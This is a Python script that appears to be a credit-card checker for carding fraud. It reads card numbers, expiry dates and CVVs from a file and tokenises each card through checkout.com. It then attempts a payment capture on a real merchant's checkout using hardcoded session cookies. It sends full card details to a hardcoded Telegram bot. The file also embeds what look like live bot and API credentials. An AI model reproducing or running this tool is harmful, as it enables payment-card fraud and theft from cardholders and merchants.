import requests
import pyfiglet
import json
import time
import user_agent
import re
import base64
import requests, re, time, uuid, json, secrets, string, random, user_agent, base64

tok = '7073895874:AAGU3cxwZjj0KbZlr7Vw6wnPuAnAMxaDCQ8'
idd = '5643656889'

A =  '\033[1;37m' #Red.... like< Red Line > only Anime fan will know☆
K = '\033[1;32m' #Green
C = '\033[2;36m' #Light Blue
Z = '\033[1;33m' #Yellow
B = '\033[2;35m' #Purple
H =  '\033[1;31m'

logo = pyfiglet.figlet_format('         EBRAHEM')
print(Z+logo)
k=("----☆----☆-----☆------☆-----☆") 
print(C+k)
lo=("☆Tele:@EbrahimEdsoky☆.")
print(Z+lo)
i=("----☆----☆-----☆------☆-----☆")
print(Z+i)
o=("==================================================================")
print(H+o)

file=open('b.txt',"+r")
nm = 0
for P in file.readlines():
	nm += 1
	n = P.split('|')[0]
	mm = int(P.split('|')[1])  
	yy = P.split('|')[2]
	if len(yy) == 2:  
	    yy = '20' + yy  
	yy = int(yy)
	cvc = P.split('|')[3].replace('\n', '')
	P = P.replace('\n', '')
	headers = {
    'authority': 'api.checkout.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'pk_afrr7wk5omf7msjv3z3xwrzspmq',
    'content-type': 'application/json',
    'origin': 'https://js.checkout.com',
    'referer': 'https://js.checkout.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user_agent.generate_user_agent(),
}

	json_data = {
    'type': 'card',
    'number': n,
    'expiry_month': mm,
    'expiry_year': yy,
    'cvv': cvc,
    'name': 'Angel Rippin',
    'phone': {},
    'preferred_scheme': '',
    'requestSource': 'JS',
}

	response = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data)

	token = (response.json()['token'])


#####
	cookies = {
    'sessionId': '14bae7fd-d799-4785-b17e-f18d1db93b8a',
    '_ga': 'GA1.1.1662322948.1715420925',
    '_gcl_au': '1.1.1776984040.1715421005',
    '_gclpay_now_button_au': '1.1.794599001.1715421049',
    '_uetsid': 'a840b4600f7b11efa1974bdb11745475',
    '_uetvid': 'a84104800f7b11ef8d75c733b6e2366e',
    '_ga_YF1DV1JK21': 'GS1.1.1715420924.1.1.1715421139.0.0.0',
    '_ga_1XKHJN3QFN': 'GS1.1.1715420924.1.1.1715421139.38.0.0',
    'forterToken': 'afbca5cfe7944cb1b3b8619670527616_1715421140752__UDF43-m4_13ck_',
}

	headers = {
    'authority': 'pay.vpayfast.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://pay.vpayfast.com',
    'referer': 'https://pay.vpayfast.com/checkout/v2/card?orderId=14502448',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}


	data = {
    'bin': P[:6],
    'last4': P[12:16],
    'name': 'Ebrahim',
    'type': 'card',
    'expiry_year': yy,
    'expiry_month': mm,
    'token': token,
    'forterTokenCookie': 'afbca5cfe7944cb1b3b8619670527616_1715421140752__UDF43-m4_13ck__tt',
    'orderId': '14502448',
}

#	print(data['last4'])
	response = requests.post('https://pay.vpayfast.com/checkout/v2/card/capture', cookies=cookies, headers=headers, data=data)



	headers = {
    'authority': 'translate-pa.googleapis.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json+protobuf',
    'origin': 'https://wap.vpayfast.com',
    'referer': 'https://wap.vpayfast.com/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-client-data': 'COP5ygE=',
    'x-goog-api-key': 'AIzaSyATBXajvzQLTDHEQbcpq0Ihe0vWDHmO520',
}

	data = f'[[["Failed","Payment Method：","全币种支付 (Visa Master DS DC)","Order Number：","14502448","<a i=0>[</a><a i=1>My Order</a><a i=2>]</a>","Total Payment Amount：","USD","٤٫٥٩","Pay Again","Contact Us","<a i=0>Suggestions:</a><a i=1>\\n1. Please confirm you filled in the correct bank card information</a><a i=2>\\n2. Please try to change the payment method or bank card to pay</a><a i=3>\\n3. Please contact {mm}*{yy} live chat service if you still can’t pay</a>","X","Livechat","Hello. What can I do for you?"],"en","ar"],"te_lib"]'.encode()

	response = requests.post('https://translate-pa.googleapis.com/v1/translateHtml', headers=headers, data=data)
	re = response.text
	
	try:
		if nm == 10:
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=doone card namber \n {P} \n {nm}')
		elif nm == 100:
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=doone card namber \n {P} \n {nm}')
		elif nm == 1000:
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=doone card namber \n {P} \n {nm}')
		elif nm == 2000:
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=doone card namber \n {P} \n {nm}')
		elif nm == 3000:
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=doone card namber \n {P} \n {nm}')
	except:
		requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=error 404  \n {P} \n {nm}')
		
	if 'فشل' in re:
		print(H,nm,P,'مرفوضة')
		
	else:
		requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text=response new  \n {P} \n {nm} \n {re}')


